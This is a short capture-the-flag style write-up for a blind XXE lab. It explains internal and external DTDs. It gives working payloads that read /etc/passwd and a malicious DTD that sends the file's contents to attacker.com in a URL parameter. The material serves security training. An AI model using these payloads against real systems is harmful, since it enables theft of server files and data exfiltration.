Title: Exploiting blind XXE to exfiltrate data using a malicious external DTD
Level: Practitioner
Desc:  This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, exfiltrate the contents of the /etc/hostname file. 


First of all what is the difference between classic XXE using interal entity and external DTD.
DTD - Document Type Definition
- An internal DTD is defined inside the XML document itself.
- An external DTD is loaded from an outside source, typically via a URL.
  
DTD can be used to bypass protection. 

classic XXE example using an internal entity:
```
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```
External DTDs can be used to bypass protections â€” like if entity definitions are restricted internally, but the parser still fetches external DTDs.

External DTD delivering the payload:
```
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://attacker.com/malicious.dtd">
<data>&sendFile;</data>
```
Then, malicious.dtd might contain:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY sendFile SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

So, using external DTD we can bypass protections and still exploit XXE vulnerability.
















